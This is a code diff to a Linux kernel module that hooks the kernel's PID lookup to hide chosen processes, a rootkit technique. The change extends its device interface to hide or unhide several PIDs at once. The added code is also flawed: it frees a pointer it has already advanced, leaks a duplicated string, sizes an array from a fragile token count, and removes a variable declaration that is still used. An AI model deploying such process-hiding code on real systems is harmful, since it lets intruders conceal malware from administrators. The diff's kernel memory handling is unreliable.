@@ -100,8 +100,9 @@ static bool is_hidden_proc(pid_t pid)
 static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
 {
     struct pid *pid = real_find_ge_pid(nr, ns);
-    while (pid && is_hidden_proc(pid->numbers->nr))
+    while (pid && is_hidden_proc(pid->numbers->nr)) {
         pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
+    }
     return pid;
 }
 
@@ -170,8 +171,10 @@ static ssize_t device_write(struct file *filep,
                             loff_t *offset)
 {
     long pid;
-    char *message;
-
+    int i = 0, count = -1;
+    char *message, *tmp;
+    char *token;
+    long *pid_arr;
     char add_message[] = "add", del_message[] = "del";
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
         return -EAGAIN;
@@ -179,19 +182,44 @@ static ssize_t device_write(struct file *filep,
     message = kmalloc(len + 1, GFP_KERNEL);
     memset(message, 0, len + 1);
     copy_from_user(message, buffer, len);
+    tmp = kstrdup(message, GFP_KERNEL);
+    while(strsep(&tmp, " ")) {
+        count += 1;
+    }
+    pid_arr = kmalloc(count * sizeof(long), GFP_KERNEL);
+    
+
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
-        kstrtol(message + sizeof(add_message), 10, &pid);
-        hide_process(pid);
+        message += sizeof(add_message);
+        i = 0;
+        while ((token = strsep(&message, " ")) != NULL) {
+            kstrtol(token, 10, pid_arr + i);
+            ++i;
+        }
+        for (i = 0; i < count; ++i) {
+            pid = *(pid_arr + i);
+            hide_process(pid);
+        }
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
-        kstrtol(message + sizeof(del_message), 10, &pid);
-        unhide_process(pid);
+        message += sizeof(del_message);
+        i = 0;
+        while ((token = strsep(&message, " ")) != NULL) {
+            kstrtol(token, 10, pid_arr + i);
+            ++i;
+        }
+        for (i = 0; i < count; ++i) {
+            pid = *(pid_arr + i);
+            unhide_process(pid);
+        }
     } else {
         kfree(message);
+        kfree(pid_arr);
         return -EAGAIN;
     }
-
+    
     *offset = len;
     kfree(message);
+    kfree(pid_arr);
     return len;
 }
 
@@ -213,7 +241,7 @@ static const struct file_operations fops = {
 static int _hideproc_init(void)
 {
     int err, dev_major;
-    dev_t dev;
+
     printk(KERN_INFO "@ %s\n", __func__);
     err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
     dev_major = MAJOR(dev);
